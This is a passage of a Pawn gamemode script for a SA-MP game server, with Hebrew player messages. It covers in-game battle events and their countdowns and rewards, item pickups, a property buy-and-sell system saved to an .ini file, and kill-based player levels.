InWarr[i] = 0;  PPr[i] = 0; WSr = 0; knoobr = 0;
SetPlayerVirtualWorld(i,0);
SendClientMessage(i,COLOR_ORANGE,".קיבלת פיצוי בסך [500] דולר על סיבה: חוסר משתתפים בגאטר");
LACY_GiveMoney(i,500);
KillTimer(CheckTimer);
}}
return 1;
}
else if(statusr == 1)
{

LACY_GiveMoney(WarWinnerr, Rewardr);
ResetPlayerWeapons(WarWinnerr);
SetPlayerInterior(WarWinnerr, 0);
SetPlayerPos(WarWinnerr, 2028.6577,1341.8792,10.8203);
//new string[256];
PlayerInfo[WarWinnerr][RPGS] ++;

SendClientMessageToAll(WHITE,"[________ גאטר טילים - מנצח ________]");
format(fuxm, sizeof(fuxm), ".$3000 ניצח בקרב טילים, הכסף שהוא זכה בוא עומד על כ,%s",GetName(WarWinnerr)),SendClientMessageToAll(0xE21E1EFF, fuxm);
format(fuxm, sizeof(fuxm), ".%d מספר הנצחנות שלו בקרב טילים",PlayerInfo[WarWinnerr][RPGS]),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");
//TogglePlayerControllable(KartWinner, 1);

WarOnr = 0; WarPlayersr = 0;
LACY_GiveMoney(WarWinnerr, 3000);
SetPlayerHealth(WarWinnerr, 100.0);
TogglePlayerControllable(WarWinnerr, 1);
//SetTimer("weaponanti",3000,1);
for(new i = 0;i<MAX_PLAYERS;i++)
{
WSr = 0; PPr[i] = 0; knoobr = 0;
if(InWarr[i] == 1)
{
SetPlayerVirtualWorld(i,0);
ResetPlayerWeapons(i);
InWarr[i] = 0; 
}
}
return 1;
}
return 1;
}


forward Checkr(playerid);
public Checkr(playerid)
{
if(WSr == 1)
{
if(WarPlayersr == 1)
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWarr[i] == 1)
{
WarWinnerr = i; WarEndr(1);
}
}
}
}
return 1;
}





public OnPlayerPickUpPickup(playerid, pickupid)
{

if (pickupid == info1)
{
SendClientMessage(playerid, COLOR_YELLOW, "!ברוכים הבאים לספינת הכסף! כל 5 שניות תקבל 500$");
SendClientMessage(playerid, COLOR_YELLOW, "!אם תשאר אפק על ספינת הכסף תקבל קיק אוטומטית מהמערכת");
}
if (pickupid == info2)
{
SendClientMessage(playerid, COLOR_YELLOW, "!ברוכים הבאים למוסך וואנג");
SendClientMessage(playerid, COLOR_YELLOW, "!אם תביאו את הרכב המבוקש תקבלו כסף המגיע לכם");
}

if (pickupid == money1k)
{
LACY_GiveMoney(playerid,3);
SendClientMessage(playerid, COLOR_LIGHTGREEN, "~~~ [= זכית ב3 דולר כי עברת בדרך צלחה! מזל טוב ~~~");
}
if (pickupid == money1d)
{
LACY_GiveMoney(playerid,1);
SendClientMessage(playerid, COLOR_LIGHTGREEN, "!הודעה חשובה: בגלל שאתה מצאת את חבילת הצחוקים אנחנו חייבים לבשר לך שזכית בדולר");
}
if (pickupid == money2d)
{
LACY_GiveMoney(playerid,2);
SendClientMessage(playerid, COLOR_LIGHTGREEN, "~~~ !עברת דרך צלחה וקיבלת דולר חח לא סתם הפעם פירגנו לך בשתי דולר ~~~");
}
if (pickupid == minihealth)
{
SetPlayerHealth(playerid, 1);
SetPlayerArmour(playerid, 1);
SendClientMessage(playerid, lblue, "--- !תיבת ההפתעות: זהירות, אתה עומד למות");
}
if (pickupid == tambal)
{
new Float:X;
new Float:Y;
new Float:Z;
GetPlayerPos(playerid, X, Y, Z);
SetPlayerPos(playerid, X, Y, Z+5000);
GivePlayerWeapon(playerid, 46, 1);
SendClientMessage(playerid, lblue, "--- ! [= תיבת ההפתעות: צניחה חופשית");
}
if (pickupid == forumadress)
{
SendClientMessage(playerid, COLOR_LIGHTGREEN, "Satla-Zone.co.il :מערכת: המערכת זיההתה אותך בתור סטלן/ינת, אנא הירשם לפורום");
SendClientMessage(playerid, COLOR_LIGHTGREEN, "[TS] 212.150.164.211:4545 :וסתם אם באלך, בוא לשרת דיבור ");
}
if (pickupid == disarmw)
{
ResetPlayerWeapons(playerid);
SendClientMessage(playerid,lblue, "--- ~!תיבת ההפתעות: הנשקים אופסו בעיה שלך");
}
if (pickupid == m4)
{
GivePlayerWeapon(playerid, 31, 100);
}
if (pickupid == saWn)
{
GivePlayerWeapon(playerid, 26, 100);
}



	new propid = -1;
	for(new id; id<MAX_PROPERTIES; id++)
	{
		if(PropInfo[id][PickupNr] == pickupid)
		{
			propid = id;
            break;
		}
	}

		    new str[128];
		new propidS = IsPlayerNearProperty(playerid);

			new ownerid = GetPlayerID(PropInfo[propidS][PropOwner]);

			if(ownerid == playerid)
			{
       format(str, 128, "~~~ (%d) \"%s\" - נכס ~~~",propid,PropInfo[propid][PropName] );
	   SendClientMessage(playerid, lblue, str);
	   format(str, 128, "%s - ברוכים הבאים לנכס שלך",GetName(playerid) );
	   SendClientMessage(playerid, 0xFFFF00AA, str);
	   SendClientMessage(playerid, 0xFFFF00AA, "/sell :על מנת למכור את הנכס שלך");
       format(str, 128, "%d$ :עד עכשיו הרווחת מהנכס הזה כ",PropInfo[propid][PropEarning] );
	   SendClientMessage(playerid, 0xFFFF00AA, str);
       format(str, 128, "%d$ :עם תמכור את הנכס תקבל פיצוי של כ",(PropInfo[propid][PropValue]/2));
	   SendClientMessage(playerid, 0xFFFF00AA, str);
	   SendClientMessage(playerid, COLOR_PURPLE, "/help prop על מנת לקבל עזרה בצע/י");


			    return 0;
				}


	if(propid != -1)
	{
	if(!PropInfo[propid][PropIsBought])
	{
       format(str, 128, "~~~ (%d) \"%s\" - נכס ~~~",propid,PropInfo[propid][PropName] );
	   SendClientMessage(playerid, lblue, str);

	   SendClientMessage(playerid, 0xFFFF00AA, "/buy :על מנת לקנות אותו");
       format(str, 128, "%d$ :עם תקנה את הנכס תרוויח בכל 10 דק' כ",PropInfo[propid][PropEarning] );
	   SendClientMessage(playerid, 0xFFFF00AA, str);
       format(str, 128, "%d$ :מחיר הנכס",PropInfo[propid][PropValue]);
	   SendClientMessage(playerid, 0xFFFF00AA, str);
	   SendClientMessage(playerid, COLOR_PURPLE, "/help prop על מנת לקבל עזרה בצע/י");

	}
	}

		if(propid != -1)
	{
	if(PropInfo[propid][PropIsBought])
	{
	if(ownerid != playerid)
{
       format(str, 128, "~~~ (%d) \"%s\" - נכס ~~~",propid,PropInfo[propid][PropName] );
	   SendClientMessage(playerid, lblue, str);
	   format(str, 128, "/buy :על מנת לקנות אותו [ %s ] :נכס זה שייך ל",PropInfo[propid][PropOwner]);
	   SendClientMessage(playerid, 0xFFFF00AA, str);
       format(str, 128, "%d$ :עם תקנה את הנכס תרוויח בכל 10 דק' כ",PropInfo[propid][PropEarning] );
	   SendClientMessage(playerid, 0xFFFF00AA, str);
       format(str, 128, "%d$ :מחיר הנכס",PropInfo[propid][PropValue]);
	   SendClientMessage(playerid, 0xFFFF00AA, str);
	   SendClientMessage(playerid, COLOR_PURPLE, "/help prop על מנת לקבל עזרה בצע/י");
	}
	}
	}

	return 1;
}

stock LoadProperties()
{
	if(fexist("PropertySystem/ProPotion.ini"))
	{
	    CountProperties();
		new Argument[9][70];
		new entry[256], BoughtProps;
		new File: propfile = fopen("PropertySystem/ProPotion.ini", io_read);
	    if (propfile)
		{
		    for(new id; id<Propertiesamount; id++)
			{
				fread(propfile, entry);
				splitprop(entry, Argument, ',');
				format(PropInfo[id][PropName], 64, "%s", Argument[0]);
				PropInfo[id][PropX] = floatstr(Argument[1]);
				PropInfo[id][PropY] = floatstr(Argument[2]);
				PropInfo[id][PropZ] = floatstr(Argument[3]);
				PropInfo[id][PropValue] = strval(Argument[4]);
				PropInfo[id][PropEarning] = strval(Argument[5]);
				format(PropInfo[id][PropOwner], MAX_PLAYER_NAME, "%s", Argument[6]);
				PropInfo[id][PropIsBought] = strval(Argument[7]);
				PropInfo[id][PropUnbuyableTime] = strval(Argument[8]);
				PropInfo[id][PickupNr] = CreatePickup(1273, 1, PropInfo[id][PropX], PropInfo[id][PropY], PropInfo[id][PropZ]);
    			if(PropInfo[id][PropIsBought] == 1)
				{
				    BoughtProps++;
				}
			}
			fclose(propfile);
			printf("===================================");
			printf("||    Created %d Properties     ||", Propertiesamount);
			printf("||%d of the properties are bought||", BoughtProps);
			printf("===================================");
		}
	}
}

stock SaveProperties()
{
	new entry[256];
	new File: propfile = fopen("PropertySystem/ProPotion.ini", io_write);
	for(new id; id<Propertiesamount; id++)
	{
	    format(entry, 128, "%s,%.2f,%.2f,%.2f,%d,%d,%s,%d,%d \r\n",PropInfo[id][PropName], PropInfo[id][PropX], PropInfo[id][PropY], PropInfo[id][PropZ], PropInfo[id][PropValue], PropInfo[id][PropEarning], PropInfo[id][PropOwner], PropInfo[id][PropIsBought], PropInfo[id][PropUnbuyableTime]);
		fwrite(propfile, entry);
	}
	printf("Saved %d Properties!", Propertiesamount);
	fclose(propfile);
}

forward splitprop(const strsrc[], strdest[][], delimiter);
public splitprop(const strsrc[], strdest[][], delimiter)
{
	new i, li;
	new aNum;
	new len;
	while(i <= strlen(strsrc)){
	    if(strsrc[i]==delimiter || i==strlen(strsrc)){
	        len = strmid(strdest[aNum], strsrc, li, i, 128);
	        strdest[aNum][len] = 0;
	        li = i+1;
	        aNum++;
		}
		i++;
	}
	return 1;
}

stock CountProperties()
{
    new entry[256];
	new File: propfile = fopen("PropertySystem/ProPotion.ini", io_read);
	while(fread(propfile, entry, 256))
	{
		Propertiesamount++;
  	}
  	fclose(propfile);
}

forward IsPlayerNearProperty(playerid);
public IsPlayerNearProperty(playerid)
{
	new Float:Distances;
	for(new prop; prop<Propertiesamount; prop++)
	{
	    Distances = GetDistanceToProperty(playerid, prop);
	    if(Distances < 1.0)
	    {

	        return prop;
		}
	}
	return -1;
}

forward Float:GetDistanceToProperty(playerid, Property);
public Float:GetDistanceToProperty(playerid, Property)
{
	new Float:x1,Float:y1,Float:z1,Float:x2,Float:y2,Float:z2;
	GetPlayerPos(playerid,x1,y1,z1);
	x2 = PropInfo[Property][PropX];
	y2 = PropInfo[Property][PropY];
	z2 = PropInfo[Property][PropZ];
	return floatsqroot(floatpower(floatabs(floatsub(x2,x1)),2)+floatpower(floatabs(floatsub(y2,y1)),2)+floatpower(floatabs(floatsub(z2,z1)),2));
}

stock GetPlayerID(const Name[])
{
	for(new i; i<MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        new pName[MAX_PLAYER_NAME];
			GetPlayerName(i, pName, sizeof(pName));
	        if(strcmp(Name, pName, true)==0)
	        {
	            return i;
			}
		}
	}
	return -1;
}

stock SendClientMessageToAllEx(exeption, color, const message[])
{
	for(new i; i<MAX_PLAYERS; i++)
	{
		if(IsPlayerConnected(i))
		{
		    if(i != exeption)
		    {
		        SendClientMessage(i, color, message);
			}
		}
	}
}

forward UpdateUnbuyableTime();
public UpdateUnbuyableTime()
{
	for(new propid; propid<Propertiesamount; propid++)
	{
	    if(PropInfo[propid][PropIsBought] == 1)
	    {
			if(PropInfo[propid][PropUnbuyableTime] > 0)
			{
	        	PropInfo[propid][PropUnbuyableTime]--;
			}
		}
	}
}


forward MapIconStreamer();
public MapIconStreamer()
{
	for(new i; i<MaximuxPlayer; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        new Float:SmallestDistance = 99999.9;
	        new CP, Float:OldDistance;
	        for(new propid; propid<Propertiesamount; propid++)
	        {
	            OldDistance = GetDistanceToProperty(i, propid);
	            if(OldDistance < SmallestDistance)
	            {
	                SmallestDistance = OldDistance;
	                CP = propid;
				}
			}
			RemovePlayerMapIcon(i, 31);
			if(PropInfo[CP][PropIsBought] == 1)
			{
                SetPlayerMapIcon(i, 31, PropInfo[CP][PropX], PropInfo[CP][PropY], PropInfo[CP][PropZ], 32, 0);
			}
			else
			{
			    SetPlayerMapIcon(i, 31, PropInfo[CP][PropX], PropInfo[CP][PropY], PropInfo[CP][PropZ], 31, 0);
			}
		}
	}
}

forward PropertyPayout();
public PropertyPayout()
{
	new str[64];
	for(new i; i<MAX_PLAYERS; i++)
	{
	    if(IsPlayerConnected(i))
	    {
	        if(PlayerProps[i] > 0)
	        {
	            LACY_GiveMoney(i, EarningsForPlayer[i]);
				format(str, 64, ".$%d הרווחת מהנכסים שלך כ,", EarningsForPlayer[i]);
				SendClientMessage(i, COLOR_LIGHTGREEN, str);
			}
		}
	}
}








//==================================WarStart====================================
forward WarStart();
public WarStart()
{
new string[256];
MoneyWinnerWar +=500;
SendClientMessageToAll(WHITE,"[_____________גאטר - מלחמה מאורגנת_____________]");
SendClientMessageToAll(COLOR_YELLOW, "! נפתחה הרשמה לקרב מאורגן, הזדרזו להירשם");
format(string,sizeof(string),".$%d :פרס למנצח מתחיל מסכום של",MoneyWinnerWar);
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/War :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");

WarOn = 1; WarPlayers = 0;
Count = 60; Countdown(); CountFuc = 1;
SAS = SetTimer("SAS",1000, 1);
return 1;
}
//==================================Countdown===================================
forward Countdown();
public Countdown()
{
new string[256];
if(Count == 40)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /War.",WarPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(Count == 20)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /War.",WarPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(Count == 10)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /War.",WarPlayers);
SendClientMessageToAll(COLOR_WHITE,string);
}
new String[256];
format(String, 256,"~w~%d",Count);
for(new i = 0; i < MAX_PLAYERS; i++)
GameTextForAll(String,1000,6);
if(Count > 0)
{
--Count;
SetTimer("Countdown", 1000, 0);
}
else
{
if(CountFuc == 1)
{
TeleportPlayerToWar();
if(knoob == 1)
{
Count = 10; Countdown(); CountFuc = 2;
}
}
if(CountFuc == 2 && Count <= 0)
{
Unfreeze();
}
}
}

forward Unfreeze();
public Unfreeze()
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(PP[i] == 1)
{
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
GameTextForAll("~g~War START!", 3000, 0);
}
}
}

forward TeleportPlayerToWar();
public TeleportPlayerToWar()
{
if(WarPlayers < MinWarPlayers)
{
WarEnd(0);
return 1;
}
new string[256];


SendClientMessageToAll(WHITE,"[______________!גאטר מלחמה מאורגנת - החל______________]");
format(string,sizeof(string)," %d :מס' משתתפים",WarPlayers),SendClientMessageToAll(0xE21E1EFF,string);
format(string,sizeof(string)," $%d:סכום זכייה שנקבע על ידי השחקנים הוא",MoneyWinnerWar),SendClientMessageToAll(0xE21E1EFF,string);
SendClientMessageToAll(WHITE,".--------------------------------------");



for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWar[i] == 1)
{
ResetPlayerWeapons(i);
//new string[256];
SetPlayerVirtualWorld(i,0);
CTP = SetTimer("asd",1000, 1);
new rand = random(sizeof(sssa));
SetPlayerPos(i, sssa[rand][0], sssa[rand][1], sssa[rand][2]);
SetPlayerInterior(i, 10);
ResetPlayerWeapons(i);
rand = random(sizeof(WarWeapons));
GivePlayerWeapon(i,WarWeapons[rand],5000);
SetPlayerArmour(i, 100.0);
SetPlayerHealth(i, 100.0);
WS = 1; PP[i] = 1; knoob = 1;
TogglePlayerControllable(i, 0);
CTP = SetTimer("asd",1000, 1);
//PP[i] =1;
}
}
return 1;
}

forward asd();
public asd()
{
if(WS == 1)
{
if(WarPlayers == 1)
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWar[i] == 1)
{
WarWinner = i; WarEnd(1);
}
}
}
}
return 1;
}


forward WarEnd(status);
public WarEnd(status)
{
if(status == 0)
{
SendClientMessageToAll(red, ".הגאטר בוטל בגלל חוסר שחקנים שהיה פחות מ-3");
SendClientMessageToAll(red, ".כל שחקן שהצטרף קיבל פיצוי בסך 500 דולר");


WarOn = 0; WarPlayers = 0;
KillTimer(CTP);
KillTimer(SAS);
for(new i = 0;i<MAX_PLAYERS;i++)
{
InWar[i] = 0;  PP[i] = 0; WS = 0; knoob = 0;
InWar[i] = 0;  PP[i] = 0; WS = 0; knoob = 0;
if(PP[i] == 1)
{
SendClientMessage(i,COLOR_ORANGE,".קיבלת פיצוי בסך [500] דולר על סיבה: חוסר משתתפים בגאטר");
LACY_GiveMoney(i,500);
SetPlayerPos(i,2144.1472,1634.6127,993.5761);
SetPlayerInterior(i,1);
WarPlayers --; InWar[i] = 0; PP[i] = 0;

return 1;
}
}
return 1;
}
else if(status == 1)
{

LACY_GiveMoney(WarWinner, Reward);
GetPlayerName(WarWinner, playername, sizeof(playername));
KillTimer(CTP);
KillTimer(SAS);
ResetPlayerWeapons(WarWinner);
SetPlayerInterior(WarWinner, 0);


PP[WarWinner] =0;
InWar[WarWinner]=0;

//new string[256];
PlayerInfo[WarWinner][Wars] ++;

SendClientMessageToAll(WHITE,"[________ גאטר מלחמה מאורגנת - מנצח ________]");
format(fuxm, sizeof(fuxm), ".$%d ניצח בקרב הטילים,הסכום שהוא זכה בוא עומד על כ,%s",MoneyWinnerWar,GetName(WarWinner)),SendClientMessageToAll(0xE21E1EFF, fuxm);
format(fuxm, sizeof(fuxm), ".%d :מספר הנצחנות שלו במלחמות מאורגנות הם",PlayerInfo[WarWinner][Wars]),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");
SetPlayerPos(WarWinner,2144.1472,1634.6127,993.5761);
SetPlayerInterior(WarWinner,1);

MoneyWinnerWar=0;
WarOn = 0; WarPlayers = 0;
TogglePlayerControllable(WarWinner, 1);

for(new i = 0;i<MAX_PLAYERS;i++)
{
InWar[i] = 0; WS = 0; PP[i] = 0; knoob = 0;
}
return 1;
}
else if(status == 2)
{
format(knob, sizeof(knob), ".ביטל את המילחמה \"%s\" האדמין ", Adminname);
SendClientMessageToAll(COLOR_PINK, knob);
WarPlayers = 0;
knoob = 0; WS = 0;
WarOn = 0;
Count = 0; CountFuc = 0;
KillTimer(CTP);
KillTimer(SAS);
for(new i = 0;i<MAX_PLAYERS;i++)
{
InWar[i] = 0; PP[i] = 0;
}
return 1;
}
return 1;
}







forward WarStartw();
public WarStartw()
{
new string[256];
MoneyWinnerMini =1500;
SendClientMessageToAll(WHITE,"[_____________גאטר - מיניגאן מאורגן_____________]");
SendClientMessageToAll(0xF6F658FF, "! נפתחה הרשמה לקרב מאורגן, הזדרזו להירשם");
format(string,sizeof(string),".$%d :פרס למנצח מתחיל מסכום של",MoneyWinnerMini);
SendClientMessageToAll(0xF6F658FF,string);
SendClientMessageToAll(0x0F6A0FF, "/Mini :יש לכם 60 שניות להצטרף, להצטרפות רשמו");
SendClientMessageToAll(WHITE,".---------------------------------");
WarOnw = 1; WarPlayersw = 0;
Countw = 60; Countdownw(); CountFucw = 1;
SASw = SetTimer("SAS",1000, 1);
return 1;
}
//==================================Countdown===================================
forward Countdownw();
public Countdownw()
{
new string[256];
if(Countw == 30)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Mini.",WarPlayersw);
SendClientMessageToAll(COLOR_WHITE,string);
}
else if(Countw == 15)
{
format(string,sizeof(string),"[Players: %d] if you want to do fun please doing /Mini.",WarPlayersw);
SendClientMessageToAll(COLOR_WHITE,string);
}
new String[256];
format(String, 256,"~w~ %d",Countw,WarPlayersw);
for(new i = 0; i < MAX_PLAYERS; i++)
GameTextForAll(String,1000,6);
if(Countw > 0)
{
--Countw;
SetTimer("Countdownw", 1000, 0);
}
else
{
if(CountFucw == 1)
{
TeleportPlayerToWarw();
if(knoobw == 1) {
Countw = 10; Countdownw(); CountFucw = 2;
}
}
if(CountFucw == 2 && Countw <= 0)
{
Unfreezew();
}
}
}

forward Unfreezew();
public Unfreezew()
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(PPw[i] == 1)
{
TogglePlayerControllable(i, 1);
SetCameraBehindPlayer(i);
GameTextForAll("~g~MiniGun Start", 3000, 0);
}
}
}

forward TeleportPlayerToWarw();
public TeleportPlayerToWarw()
{
if(WarPlayersw < MinWarPlayersw)
{
WarEndw(0);
return 1;
}
new string[256];
SendClientMessageToAll(WHITE,"[______________!גאטר מיניגאן - החל______________]");
format(string,sizeof(string)," %d :מס' משתתפים",WarPlayersw),SendClientMessageToAll(0xE21E1EFF,string);
format(string,sizeof(string)," $%d:סכום זכייה שנקבע על ידי השחקנים הוא",MoneyWinnerMini),SendClientMessageToAll(0xE21E1EFF,string);
SendClientMessageToAll(WHITE,".--------------------------------------");


for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWarw[i] == 1)
{
ResetPlayerWeapons(i);
SetPlayerVirtualWorld(i,15);
new randw = random(sizeof(sssaw));
SetPlayerPos(i, sssaw[randw][0], sssaw[randw][1], sssaw[randw][2]);
//editprofilelayerInterior(i, 10);
ResetPlayerWeapons(i);
GivePlayerWeapon(i,38,8000);

WSw= 1; PPw[i] = 1; knoobw = 1;
TogglePlayerControllable(i, 0);
CTPw = SetTimer("asdw",1000, 1);
}
}
return 1;
}

forward WarEndw(statusw);
public WarEndw(statusw)
{
if(statusw == 0)
{
SendClientMessageToAll(red, ".הגאטר בוטל בגלל חוסר שחקנים שהיה פחות מ-3");
SendClientMessageToAll(red, ".כל שחקן שהצטרף קיבל פיצוי בסך 500 דולר");


WarOnw = 0; WarPlayersw = 0;
KillTimer(CTPw);
KillTimer(SASw);
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWarw[i] == 1)
{
ResetPlayerWeapons(i);
InWarw[i] = 0;  PPw[i] = 0; WSw= 0; knoobw = 0;
SendClientMessage(i,COLOR_ORANGE,".קיבלת פיצוי בסך [500] דולר על סיבה: חוסר משתתפים בגאטר");
LACY_GiveMoney(i,500);
SetPlayerVirtualWorld(i,0);
}
}
return 1;
}
else if(statusw == 1)
{
KillTimer(CTPw);
KillTimer(SASw);
ResetPlayerWeapons(WarWinnerw);
LACY_GiveMoney(WarWinnerw,MoneyWinnerMini);
PlayerInfo[WarWinnerw][MINIGUN] ++;
SendClientMessageToAll(WHITE,"[________ גאטר מיניגאן - מנצח ________]");
format(fuxm, sizeof(fuxm), ".$%d ניצח בקרב מיניגאן, סכום הכספי שהוא זכה בוא עומד על,%s",MoneyWinnerMini,GetName(WarWinnerw)),SendClientMessageToAll(0xE21E1EFF, fuxm);
format(fuxm, sizeof(fuxm), ".%d :מספר הנצחנות שלו במלחמות מאורגנות הם",PlayerInfo[WarWinnerw][MINIGUN]),SendClientMessageToAll(0xE21E1EFF, fuxm);
SendClientMessageToAll(WHITE,".-------------------------------------");

SetPlayerPos(WarWinnerw,2144.1472,1634.6127,993.5761);
SetPlayerInterior(WarWinnerw,1);
MoneyWinnerMini=0;

TogglePlayerControllable(WarWinnerw, 1);
WarOnw = 0; WarPlayersw = 0;
for(new i = 0;i<MAX_PLAYERS;i++)
{
WSw = 0;  knoobw = 0;
if(InWarw[i] == 1)
{
ResetPlayerWeapons(i);
SetPlayerVirtualWorld(i,0);
InWarw[i] =0;
PPw[i] = 0;
}
}
return 1;

}
else if(statusw == 2)
{
WarPlayersw = 0;
knoobw = 0; WSw = 0;
WarOnw = 0;
Countw = 0; CountFucw = 0;
KillTimer(CTPw);
KillTimer(SASw);
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWarw[i] == 1)
{
SetPlayerVirtualWorld(i,0);
}
InWarw[i] = 0; PPw[i] = 0;
}
return 1;
}
return 1;
}

forward asdw();
public asdw()
{
if(WSw == 1)
{
if(WarPlayersw == 1)
{
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(InWarw[i] == 1)
{
WarWinnerw = i; WarEndw(1);
}
}
}
}
return 1;
}




//=[PlayerToPoint]==============================================================
stock PlayerToPoint(Float:radi, playerid, Float:x, Float:y, Float:z)
{
if(IsPlayerConnected(playerid))
{
new Float:oldposx, Float:oldposy, Float:oldposz;
new Float:tempposx, Float:tempposy, Float:tempposz;
GetPlayerPos(playerid, oldposx, oldposy, oldposz);
tempposx = (oldposx -x);
tempposy = (oldposy -y);
tempposz = (oldposz -z);
if (((tempposx < radi) && (tempposx > -radi)) && ((tempposy < radi) && (tempposy > -radi)) && ((tempposz < radi) && (tempposz > -radi)))
{
return 1;
}
}
return 0;
}
//=[Levels]=========================================================================
forward Levels();
public Levels()
{
new string[256];
for(new i = 0;i<MAX_PLAYERS;i++)
{
if(IsPlayerConnected(i))
{

if (PlayerInfo[i][Level] == 0 && PlayerInfo[i][Kills] >= 100)
{
PlayerInfo[i][Level] +=1;

SetPlayerWantedLevel(i,1);

dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
PlayerInfo[i][aLevelnl]=2;
PlayerInfo[i][aKillsnl]=200;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);

format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 1 && PlayerInfo[i][Kills] >= 300)
{
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,2);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "בייבי סטלה זון");
PlayerInfo[i][aLevelnl]=3;
PlayerInfo[i][aKillsnl]=200;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);


format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 2 && PlayerInfo[i][Kills] >= 500)
{
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,3);
PlayerInfo[i][aLevelnl]=4;
PlayerInfo[i][aKillsnl]=200;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 3 && PlayerInfo[i][Kills] >= 700)
{
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,4);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
dini_Set(GetPlayerFile(i), "Tag", "סטלן מתפתח בסטלה זון");
PlayerInfo[i][aLevelnl]=5;
PlayerInfo[i][aKillsnl]=300;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}
if (PlayerInfo[i][Level] == 4 && PlayerInfo[i][Kills] >= 1000) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,5);
dini_IntSet(GetPlayerFile(i), "Level", PlayerInfo[i][Level]);
PlayerInfo[i][aLevelnl]=6;
PlayerInfo[i][aKillsnl]=300;
dini_IntSet(GetPlayerFile(i), "aKillsnl", PlayerInfo[i][aKillsnl]);
dini_IntSet(GetPlayerFile(i), "aLevelnl", PlayerInfo[i][aLevelnl]);

format(string, sizeof(string), ">>.%s :שימו לב, השחקן/ינת", GetName(i));
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d :עבר/ה לרמה חדשה", PlayerInfo[i][Level]);
SendClientMessageToAll(COLOR_PINK, string);
format(string, sizeof(string), ">>.%d הרמה הבאה שלו %d :הריגות לרמה הבאה של השחקן", PlayerInfo[i][aLevelnl],PlayerInfo[i][aKillsnl]);
SendClientMessageToAll(COLOR_PINK, string);

}

if (PlayerInfo[i][Level] == 5 && PlayerInfo[i][Kills] >= 1300) {
PlayerInfo[i][Level] +=1;
SetPlayerWantedLevel(i,6);
